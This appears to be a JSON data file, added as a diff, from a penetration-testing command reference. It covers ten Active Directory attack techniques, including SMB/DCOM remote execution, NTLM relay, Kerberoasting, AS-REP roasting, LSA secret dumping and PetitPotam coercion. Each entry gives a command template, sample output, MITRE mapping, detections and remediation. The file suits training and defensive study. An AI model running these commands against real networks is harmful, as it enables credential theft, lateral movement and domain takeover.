@@ -1,0 +1,498 @@
+[
+  {
+    "id": "impacket-smbexec",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "impacket-smbexec <domain>/<user>:<pass>@<target>",
+    "name": "SMB Exec (Stealthier)",
+    "description": "Executes commands via SMB without creating a service \u2014 stealthier than PsExec.",
+    "arguments": {
+      "<domain>/<user>:<pass>@<target>": "Credentials and target"
+    },
+    "expected_output": "C:\\Windows\\system32>whoami\ncorp\\admin",
+    "use_case": "Stealthier than PsExec \u2014 doesn't create a service binary on disk.",
+    "prerequisites": [
+      "Admin credentials",
+      "SMB access"
+    ],
+    "mitre_mapping": [
+      "T1021.002"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "SMB file operations",
+      "Command execution patterns"
+    ],
+    "remediation": [
+      "Monitor SMB activity",
+      "Restrict admin shares"
+    ],
+    "common_mistakes": [
+      "Slower than PsExec"
+    ],
+    "alternatives": [
+      "impacket-psexec",
+      "impacket-wmiexec"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "smb",
+      "lateral-movement",
+      "stealth",
+      "execution"
+    ]
+  },
+  {
+    "id": "impacket-dcomexec",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "impacket-dcomexec <domain>/<user>:<pass>@<target>",
+    "name": "DCOM Remote Execution",
+    "description": "Executes commands via DCOM (Distributed COM) \u2014 another lateral movement option.",
+    "arguments": {
+      "<domain>/<user>:<pass>@<target>": "Credentials"
+    },
+    "expected_output": "C:\\Windows\\system32>whoami",
+    "use_case": "Alternative to WMI/SMB execution \u2014 uses DCOM objects.",
+    "prerequisites": [
+      "Admin credentials",
+      "DCOM access (port 135 + dynamic)"
+    ],
+    "mitre_mapping": [
+      "T1021.003"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "DCOM object instantiation events",
+      "Unusual process from DllHost.exe"
+    ],
+    "remediation": [
+      "Restrict DCOM access",
+      "Monitor DCOM usage"
+    ],
+    "common_mistakes": [
+      "Firewall blocking dynamic ports"
+    ],
+    "alternatives": [
+      "impacket-wmiexec",
+      "impacket-psexec"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "dcom",
+      "lateral-movement",
+      "remote-execution"
+    ]
+  },
+  {
+    "id": "impacket-ntlmrelayx",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "impacket-ntlmrelayx -tf targets.txt -smb2support",
+    "name": "NTLM Relay Attack",
+    "description": "Relays captured NTLM authentication to other hosts \u2014 no cracking needed.",
+    "arguments": {
+      "-tf": "Target file",
+      "-smb2support": "Support SMBv2"
+    },
+    "expected_output": "[*] HTTPD: Received connection from 10.0.0.50\n[*] Relaying to 10.0.0.10\n[*] Authenticated successfully as CORP\\admin",
+    "use_case": "Relay authentication to gain access without knowing the password.",
+    "prerequisites": [
+      "Responder capturing auth",
+      "Targets without SMB signing"
+    ],
+    "mitre_mapping": [
+      "T1557.001"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "NTLM auth from unexpected sources",
+      "Relay patterns in network traffic"
+    ],
+    "remediation": [
+      "Enable SMB signing on all hosts",
+      "Disable NTLM where possible"
+    ],
+    "common_mistakes": [
+      "Target has SMB signing enforced"
+    ],
+    "alternatives": [
+      "Responder (capture)",
+      "mitm6 (IPv6 relay)"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "ntlm-relay",
+      "mitm",
+      "authentication",
+      "lateral-movement"
+    ]
+  },
+  {
+    "id": "rubeus-kerberoast",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe kerberoast /outfile:hashes.txt",
+    "name": "Rubeus Kerberoasting (Windows)",
+    "description": "Windows-native Kerberoasting \u2014 requests TGS tickets for offline cracking.",
+    "arguments": {
+      "/outfile": "Save hashes to file"
+    },
+    "expected_output": "[*] Found 5 SPNs\n[*] Hash written to hashes.txt",
+    "use_case": "Kerberoast from a Windows machine without Python/Impacket.",
+    "prerequisites": [
+      "Domain user session on Windows",
+      "Rubeus binary"
+    ],
+    "mitre_mapping": [
+      "T1558.003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "TGS requests for multiple SPNs (Event 4769)",
+      "Rubeus binary detection"
+    ],
+    "remediation": [
+      "AES encryption for SPNs",
+      "Strong service passwords",
+      "gMSA"
+    ],
+    "common_mistakes": [
+      "AV/EDR blocking Rubeus"
+    ],
+    "alternatives": [
+      "impacket-GetUserSPNs (Linux)",
+      "PowerView"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "kerberoast",
+      "windows",
+      "rubeus",
+      "tgs",
+      "native"
+    ]
+  },
+  {
+    "id": "rubeus-asreproast",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe asreproast /outfile:asrep.txt",
+    "name": "Rubeus AS-REP Roast (Windows)",
+    "description": "Finds and roasts accounts without pre-auth from Windows.",
+    "arguments": {
+      "/outfile": "Save hashes"
+    },
+    "expected_output": "[*] Found 2 users without pre-auth\n[*] Hashes written to asrep.txt",
+    "use_case": "AS-REP Roast from Windows \u2014 finds vulnerable accounts automatically.",
+    "prerequisites": [
+      "Domain user session"
+    ],
+    "mitre_mapping": [
+      "T1558.004"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "AS-REQ without pre-auth events"
+    ],
+    "remediation": [
+      "Enable pre-auth on all accounts"
+    ],
+    "common_mistakes": [
+      "No accounts without pre-auth"
+    ],
+    "alternatives": [
+      "impacket-GetNPUsers (Linux)"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "asrep",
+      "kerberos",
+      "windows",
+      "rubeus"
+    ]
+  },
+  {
+    "id": "sharphound-collect",
+    "tool": "sharphound",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "SharpHound.exe -c All --outputdirectory C:\\temp\\",
+    "name": "SharpHound Collection (Windows)",
+    "description": "Windows-native BloodHound data collector \u2014 runs as current domain user.",
+    "arguments": {
+      "-c All": "Collect all data types",
+      "--outputdirectory": "Output location"
+    },
+    "expected_output": "[*] Resolved Collection Methods: All\n[*] Collected 1532 users, 89 groups\n[*] Zip: 20240115_BloodHound.zip",
+    "use_case": "Collect AD data from a Windows machine for BloodHound analysis.",
+    "prerequisites": [
+      "Domain user session",
+      "SharpHound binary"
+    ],
+    "mitre_mapping": [
+      "T1087",
+      "T1069"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "LDAP enumeration volume",
+      "SharpHound signatures in EDR"
+    ],
+    "remediation": [
+      "Monitor mass LDAP queries",
+      "EDR detection rules"
+    ],
+    "common_mistakes": [
+      "EDR blocking execution",
+      "Not collecting all types"
+    ],
+    "alternatives": [
+      "bloodhound-python (Linux)",
+      "ADExplorer"
+    ],
+    "references": [
+      "https://github.com/SpecterOps/BloodHound"
+    ],
+    "tags": [
+      "bloodhound",
+      "collection",
+      "windows",
+      "active-directory"
+    ]
+  },
+  {
+    "id": "powerview-enum",
+    "tool": "powerview",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "Import-Module .\\PowerView.ps1; Get-DomainUser -SPN | Select samaccountname,serviceprincipalname",
+    "name": "PowerView SPN Enumeration",
+    "description": "Finds service accounts with SPNs set \u2014 targets for Kerberoasting.",
+    "arguments": {
+      "Get-DomainUser -SPN": "Find users with SPNs set"
+    },
+    "expected_output": "samaccountname    serviceprincipalname\nsvc_sql           MSSQLSvc/sql01.corp.local\nsvc_web           HTTP/web01.corp.local",
+    "use_case": "Identify Kerberoastable service accounts using PowerView.",
+    "prerequisites": [
+      "PowerShell access",
+      "PowerView module"
+    ],
+    "mitre_mapping": [
+      "T1087.002"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "PowerShell script block logging",
+      "Module loading events"
+    ],
+    "remediation": [
+      "Monitor PowerShell execution",
+      "Constrained Language Mode"
+    ],
+    "common_mistakes": [
+      "AMSI blocking PowerView"
+    ],
+    "alternatives": [
+      "Get-ADUser -Filter {ServicePrincipalName -ne '$null'}"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit"
+    ],
+    "tags": [
+      "powerview",
+      "spn",
+      "enumeration",
+      "kerberoast",
+      "powershell"
+    ]
+  },
+  {
+    "id": "netexec-winrm",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec winrm <target_range> -u <user> -p <pass>",
+    "name": "WinRM Access Check (Mass)",
+    "description": "Checks WinRM access across multiple hosts \u2014 finds where you can get shells.",
+    "arguments": {
+      "winrm": "WinRM protocol",
+      "<target_range>": "IP range or CIDR"
+    },
+    "expected_output": "WINRM 10.0.0.10 5985 PC01 [+] CORP\\admin:pass (Pwn3d!)",
+    "use_case": "Quickly identify which hosts you can access via WinRM for lateral movement.",
+    "prerequisites": [
+      "Valid credentials",
+      "WinRM port 5985 open"
+    ],
+    "mitre_mapping": [
+      "T1021.006"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "WinRM auth attempts across multiple hosts"
+    ],
+    "remediation": [
+      "Restrict Remote Management Users",
+      "Monitor WinRM access"
+    ],
+    "common_mistakes": [
+      "User not in Remote Management Users group"
+    ],
+    "alternatives": [
+      "evil-winrm",
+      "Enter-PSSession"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "winrm",
+      "mass-check",
+      "lateral-movement",
+      "access"
+    ]
+  },
+  {
+    "id": "netexec-lsa",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec smb <target> -u admin -p pass --lsa",
+    "name": "Dump LSA Secrets",
+    "description": "Remotely dumps LSA secrets including cached credentials and service account passwords.",
+    "arguments": {
+      "--lsa": "Dump LSA secrets"
+    },
+    "expected_output": "CORP\\admin:$DCC2$...\nDPAPI_SYSTEM:...\n_SC_SQLService:SqlP@ss123",
+    "use_case": "Extract cached domain credentials and service account passwords from LSA.",
+    "prerequisites": [
+      "Local admin on target",
+      "SMB access"
+    ],
+    "mitre_mapping": [
+      "T1003.004"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "LSA access events",
+      "Remote registry access"
+    ],
+    "remediation": [
+      "Credential Guard",
+      "Monitor LSA access"
+    ],
+    "common_mistakes": [
+      "Not having local admin"
+    ],
+    "alternatives": [
+      "mimikatz lsadump::secrets",
+      "impacket-secretsdump"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "lsa",
+      "secrets",
+      "cached",
+      "credentials",
+      "dump"
+    ]
+  },
+  {
+    "id": "petitpotam",
+    "tool": "petitpotam",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "python3 PetitPotam.py <listener_ip> <dc_ip>",
+    "name": "PetitPotam (Coerce Auth)",
+    "description": "Coerces the DC to authenticate to your machine \u2014 combine with ntlmrelayx for domain takeover.",
+    "arguments": {
+      "<listener_ip>": "Your IP (running ntlmrelayx)",
+      "<dc_ip>": "Domain controller"
+    },
+    "expected_output": "[*] Triggering authentication from DC01...\n[+] DC01$ authenticated to our listener!",
+    "use_case": "Force DC authentication for relay attacks \u2014 can lead to full domain compromise.",
+    "prerequisites": [
+      "Network access to DC",
+      "ntlmrelayx running"
+    ],
+    "mitre_mapping": [
+      "T1187"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "EFS-related RPC calls from DC",
+      "NTLM auth from DC to non-DC"
+    ],
+    "remediation": [
+      "Patch PetitPotam",
+      "Enable EPA",
+      "Disable NTLM on DCs"
+    ],
+    "common_mistakes": [
+      "DC already patched",
+      "SMB signing on DC"
+    ],
+    "alternatives": [
+      "Coercer (multiple coercion methods)",
+      "PrinterBug"
+    ],
+    "references": [
+      "https://github.com/topotam/PetitPotam"
+    ],
+    "tags": [
+      "coercion",
+      "ntlm",
+      "relay",
+      "domain-takeover",
+      "dc"
+    ]
+  }
+]
